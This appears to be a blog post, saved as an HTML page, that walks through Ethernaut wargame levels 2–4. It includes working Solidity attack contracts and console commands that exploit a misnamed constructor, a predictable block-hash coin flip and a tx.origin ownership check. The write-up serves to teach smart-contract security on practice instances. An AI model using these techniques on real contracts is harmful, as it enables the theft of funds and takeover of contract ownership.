@@ -1,0 +1,341 @@
+<!doctype html>
+<html lang="en" itemscope itemtype="http://schema.org/Person">
+<head>
+  <meta charset="utf-8">
+  <!-- Site Meta Data -->
+  <title>/Ethernaut/Levels 2,3 and 4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="Compl3x-9">
+
+  <link rel="shortcut icon" href="">
+
+  <!-- schema.org -->
+  <meta itemprop="name" content="Compl3x-9's web">
+  <meta itemprop="image" content="">
+  <meta itemprop="description" content="">
+
+  <!-- Style Meta Data -->
+  <link rel="stylesheet" href="./theme/css/milligram.css" type="text/css" />
+  <link rel="stylesheet" href="./theme/css/custom.css" type="text/css" />
+  <link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"
+      crossorigin="anonymous">
+  <!-- Feed Meta Data -->
+
+  <!-- Twitter Feed -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="">
+  <meta name="twitter:image" content="">
+
+<meta name="twitter:creator" content="">
+<meta name="twitter:url" content="./ethernaut2-3-4.html">
+<meta name="twitter:title" content="Compl3x-9's web ~ /Ethernaut/Levels 2,3 and 4">
+<meta name="twitter:description" content="Write-up of levels 2,3 and 4 of Ethernaut, an Ethereum wargame.">
+
+<!-- Facebook Meta Data -->
+<meta property="og:title" content="Compl3x-9's web ~ /Ethernaut/Levels 2,3 and 4" />
+<meta property="og:description" content="Write-up of levels 2,3 and 4 of Ethernaut, an Ethereum wargame." />
+<meta property="og:image" content="" />
+</head>
+
+<body>
+    <div class="container">
+
+    <!-- Navbar -->
+      <div class="navbar">
+        <ul>
+            <div>
+                <li>
+                    <a href="."><h3>Compl3x-9's web</h3></a>
+                </li>
+                <li>
+                </li>
+            </div>
+        </ul>
+      </div>
+
+  <!-- Sidebar -->
+    <sidebar>
+        <ul class="static-item">
+
+                <li><a href="./pages/about.html">About</a></li>
+                <li><a href="./pages/tfg.html">Thesis</a></li>
+        </ul>
+
+        <ul>
+                <div class="cat-border">
+                <li style="color: #F2F1EF; background-color: #6C7A89;">Categories</li>
+                    <li><a href="./category/cryptohack.html">CryptoHack</a></li>
+                    <li><a href="./category/ethernaut.html">Ethernaut</a></li>
+                    <li><a href="./category/publicity.html">Publicity</a></li>
+                </div>
+        </ul>
+
+            <h2><br/>BLOGROLLS</h2>
+            <ul>
+                    <li><a href="https://7rocky.github.io/en/">Cool guy</a></li>
+                    <li><a href="https://karpathy.ai/">Awesome fella</a></li>
+                    <li><a href="https://jlxip.net/">He scares me</a></li>
+            </ul>
+
+        <p>
+                <span>
+                    <a href="https://github.com/Compl3x-9" target="_blank">
+                        <img class="social-icons-m" src="./theme/images/icons/github.png">
+                    </a>
+                </span>
+        </p>
+        <p>
+        </p>
+        <p>
+        </p>
+    </sidebar>
+
+    <maincontent>
+<h2>
+    <a href="./ethernaut2-3-4.html" rel="bookmark" title="Permalink to /Ethernaut/Levels 2,3 and 4">/Ethernaut/Levels 2,3 and 4</a>
+</h2>
+
+<div>
+    <b>By: </b><a href="./author/compl3x-9.html">Compl3x-9</a><b>    On: </b>Sat 28 October 2023<br />
+    <b>In: </b><a href="./category/ethernaut.html" rel="bookmark" title="Permalink to Ethernaut">Ethernaut</a><br />
+    <em><b>Tags: </b>
+                <span><a href="./tag/writeup.html">#writeup </a></span>
+                <span><a href="./tag/web3.html">#web3 </a></span>
+    </em>
+    <hr>
+</div>
+
+<div>
+    <mainarticle>
+    <h1>ETHERNAUT</h1>
+<p>I'm back with the write-ups for some of the early levels of ethernaut.
+With the explication of level 1's write-up out of the way, these</p>
+<h1>Level 2 (Fallout)</h1>
+<blockquote>
+<p>Claim ownership of the contract below to complete this level.</p>
+<p>Things that might help</p>
+<div class="highlight"><pre><span></span><code>Solidity Remix IDE
+</code></pre></div>
+
+<p><a href="https://ethernaut.openzeppelin.com/level/2">Link to Ethernaut's level 2</a></p>
+</blockquote>
+<h3>Solution</h3>
+<p>I got stuck in this level because I forgot how it was to be a complete noob
+at something, so I looked at <a href="https://github.com/0xIchigo/ethernaut/blob/master/Fallout/Solution.md">0xIchigo's write-up</a>.
+In retrospective, I'm really ashamed that I had to look it up but, at the same
+time, happy that I did before I quit (but mostly ashamed).</p>
+<p>Yeah, this challenge was very easy. Go ahead and read the contract, you can
+maybe spot the solution in a moment. If you need a clue, there's a <strong>typo</strong>
+in the code. Did you find it?</p>
+<p>The solution was in the constructor. If we read <a href="https://docs.soliditylang.org/en/latest/contracts.html#constructors">the documentation</a>,
+we can see that the only way to define a constructor nowadays is
+with <code>constructor(...){...}</code>. There's a warning indicating us
+that prior to Solidity version 0.5, constructors could be defined
+as functions <em>of the same name</em> as the contract, which is what
+this level is about. The constructor's name has a typo, so we
+can call it as if it was a normal function.</p>
+<div class="highlight"><pre><span></span><code>&gt;&gt; contract.Fal1out()
+&gt;&gt; contract.owner()
+&quot;0xdeadbeefffffffff0123456789aBcDeFffffffff&quot;
+</code></pre></div>
+
+<p>This text pops up when completing the challenge:</p>
+<blockquote>
+<p>The story of Rubixi is a very well known case in the Ethereum ecosystem. The
+company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they
+didn't rename the constructor method of its contract.
+This allowed the attacker to call the old constructor and claim ownership of
+the contract, and steal some funds. Yep. Big mistakes can be made in
+smartcontractland.
+So I guess this challenge wasn't that silly. It's cool to learn some history
+of contract security along the way.</p>
+</blockquote>
+<h1>LEVEL 3 (Coin Flip)</h1>
+<blockquote>
+<p>This is a coin flipping game where you need to build up your winning streak
+by guessing the outcome of a coin flip. To complete this level you'll need to
+use your psychic abilities to guess the correct outcome 10 times in a row.
+<a href="https://ethernaut.openzeppelin.com/level/3">Link to Ethernaut's level 3</a></p>
+</blockquote>
+<h3>Analysis</h3>
+<p>We can see that the contract only has a public function, <code>flip(bool guess)</code>,
+that lets you do a pseudo-coinflip. The function follows these steps:</p>
+<ol>
+<li>The function calculates a value based on the block number: <code>uint256
+   blockValue = uint256(blockhash(block.number - 1));</code></li>
+<li>It checks that this call to <code>flip()</code> is the only one in the block</li>
+<li>It does an integer division of <code>blockValue</code> against <code>FACTOR</code>, which is a BIG
+   number defined at the start of the contract.</li>
+<li>If this integer division is equal to 1, then the coinflip is True, and it is
+   False otherwise. This means that the coinflip is True if
+   <code>FACTOR &lt;= blockValue &lt; 2*FACTOR</code></li>
+<li>If your guess is right, the consecutive wins variable goes up, if not it
+   resets to 0.</li>
+</ol>
+<p>As a CTF player focused in cryptography, the attack vector was pretty clear,
+but I guessed that I'd have to write my <em>first ever smart contract</em>, but
+I didn't wanno D: ; so I analysed other things to see if there was another
+way around it. First, the <code>FACTOR</code> variable was well initialized, which meant
+that the coinflip was balanced (I was hoping
+that it'd be so big that the prediction would always be False); then, the
+operations made after checking the prediction, which were correct; and
+last, the <code>blockhash()</code> function, but it gave a correct 256-bit value.
+So, I threw my fears away as I opened up Remix.</p>
+<p>The checks for the value of <code>FACTOR</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">5789604461865809771178549250434395392663499233282028201972879</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">x</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span>
+<span class="mi">256</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">bin</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="s1">&#39;0b1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
+</code></pre></div>
+
+<h3>Solution</h3>
+<p>The vulnerability was that the coinflip was calculated from the block number,
+which means that it is <strong>predictable</strong>. We only need to know the block number
+the coin flip will be on, and to not guess we'll create a smart contract.</p>
+<p>The idea is that if we call the <code>guess()</code> function from another function call,
+both of them must be in the same block, so we can recreate the coinflip and
+send the result as our guess. This is the contract that I wrote, and my first
+Solidity contract.</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+
+<span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.8.18</span><span class="p">;</span>
+
+interface<span class="w"> </span>CoinFlipInterface<span class="p">{</span>
+<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">flip</span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">_guess</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">CoinFlipGuesser</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">owner</span><span class="p">;</span>
+<span class="w">    </span><span class="c1">// Your instance&#39;s address</span>
+<span class="w">    </span>CoinFlipInterface<span class="w"> </span>CoinFlipContract<span class="w"> </span><span class="o">=</span><span class="w"> </span>CoinFlipInterface<span class="p">(</span><span class="mh">0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">guessRight</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>owner<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span>blockhash<span class="p">(</span><span class="k">block.number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">));</span>
+<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>blockValue<span class="w"> </span><span class="o">/</span><span class="w"> </span>FACTOR<span class="p">;</span>
+<span class="w">        </span><span class="kt">bool</span><span class="w"> </span><span class="nv">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>coinFlip<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kt">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
+
+<span class="w">        </span><span class="kt">bool</span><span class="w"> </span><span class="nv">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CoinFlipContract<span class="p">.</span>flip<span class="p">(</span>side<span class="p">);</span>
+<span class="w">        </span><span class="kt">return</span><span class="w"> </span>res<span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Now this abomination lives in Sepolia's blockchain and I don't know how to feel
+about it.</p>
+<p>After deploying the contract, you have to call the function 10 times, which was
+tedious and I wish I had automated it in some way, but oh well. I made sure that
+the level condition was fulfilled, and I submitted my instance.</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">consecutiveWins</span><span class="p">()).</span><span class="nx">toNumber</span><span class="p">()</span>
+<span class="mf">10</span>
+</code></pre></div>
+
+<p>The final text:</p>
+<blockquote>
+<p>Generating random numbers in solidity can be tricky. There currently isn't a
+native way to generate them, and everything you use in smart contracts is
+publicly visible, including the local variables and state variables marked as
+private. Miners also have control over things like blockhashes, timestamps,
+and whether to include certain transactions - which allows them to bias these
+values in their favor.</p>
+</blockquote>
+<h1>LEVEL 4 (Telephone)</h1>
+<blockquote>
+<p>Claim ownership of the contract below to complete this level.</p>
+</blockquote>
+<p><a href="https://ethernaut.openzeppelin.com/level/4">Link to Ethernaut's level 4</a></p>
+<h3>Analysis and solution</h3>
+<p>I was thinking in only posting levels 2 and 3, but this is quite short and easy.</p>
+<p>The contract is the shortest that we've encountered here, and apart from the constructor
+it only contains this function:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">function</span><span class="w"> </span><span class="nv">changeOwner</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_owner</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">tx.origin</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span>_owner<span class="p">;</span>
+<span class="w">   </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>So, the only thing we need to do is make sure that the condition inside
+the <code>if</code> statement is met, and for that we need to understand what's inside.
+We already know wnat <code>msg.sender</code> is: is the address of whoever calls the
+function, it being a smart contract or an user account. <code>tx.origin</code> is
+a different story.</p>
+<p>Tx refers to the ETH transaction that made the call. In Ethereum there's
+two types of addresses: contract addresses and EOA (Externally Owned Account)
+addresses, which refer to personal accounts that work with a public/secret
+key pair and are the only ones that can create transactions. A contract
+can call another contract, but only when triggered by another call;
+<strong>contracts can't call other contracts on their own</strong>. <code>tx.origin</code> then
+refers to the address that made the initial transaction.</p>
+<p>So, to trigger the condition we need to make a transaction to call
+a contract, which then calls the <code>changeOwner()</code> function. That
+way, <code>tx.origin</code> will be our address and <code>msg.sender</code> the contract
+address, which are different. Here's the contract that I used
+as the intermediary:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.8.18</span><span class="p">;</span>
+
+interface<span class="w"> </span>Level4_interface<span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">changeOwner</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_owner</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">Ethernaut_sol</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">level4solve</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">lvl4_addr</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span>Level4_interface<span class="w"> </span>lvl4<span class="w"> </span><span class="o">=</span><span class="w"> </span>Level4_interface<span class="p">(</span>lvl4_addr<span class="p">);</span>
+<span class="w">        </span>lvl4<span class="p">.</span>changeOwner<span class="p">(</span><span class="k">tx.origin</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>And the change of owner:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Before calling level4solve</span>
+<span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">contract</span><span class="p">.</span><span class="n">owner</span><span class="p">()</span>
+<span class="s">&quot;0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446&quot;</span>
+
+<span class="c1">// After calling it</span>
+<span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">contract</span><span class="p">.</span><span class="n">owner</span><span class="p">()</span>
+<span class="s">&quot;0xdeadbeefffffffff0123456789aBcDeFffffffff&quot;</span>
+</code></pre></div>
+
+<p>After submiting the level instance, Ethernaut talks about how
+<code>tx.origin</code> is vulnerable to phishing attacks, where you trick
+people into sending ETH to a malicious contract which then
+uses the fact that <code>tx.origin</code> is now your address in
+every call they do.</p>
+<h1>THE END</h1>
+<p>Blockchain security is being an nice breath of fresh air for me.
+It's been though to make these write-ups mainly because I just
+want to continue solving Ethernaut levels instead of writing.</p>
+<p>Try Ethernaut for yourselves if you haven't, and happy hacking!</p>
+    </mainarticle>
+</div>
+<hr>
+        
+<div>
+        <i>If you found the article helpful, please share or cite the article, and spread the word:</i>
+            <p style="margin-top: 2%;">
+                <span><a target="_blank" rel="nofollow" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=400,width=700');return false;" title="Twitter" href="https://twitter.com/share?url=./ethernaut2-3-4.html&text=/Ethernaut/Levels 2,3 and 4&via="><img class="social-icons-a" src="./theme/images/icons/twitter.png"></a></span>
+                <span><a target="_blank" title="Facebook" rel="nofollow" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=500,width=700');return false;" href="https://www.facebook.com/sharer.php?u=./ethernaut2-3-4.html&t=/Ethernaut/Levels 2,3 and 4"><img class="social-icons-a" src="./theme/images/icons/facebook.png"></a></span>
+
+                <a  target="_blank" title="Linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=./ethernaut2-3-4.html&title=/Ethernaut/Levels 2,3 and 4" rel="nofollow" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=450,width=650');return false;"><img class="social-icons-a" src="./theme/images/icons/linkedin.png"></a>
+            </p>
+</div>
+<hr>
+    <p><i>For any feedback or corrections, please write in to: </i><b> Compl3x-9 </b></p>
+        
+    </maincontent>
+
+  <!-- Analytics -->
+
+  </div>
+</body>
+
+</html>
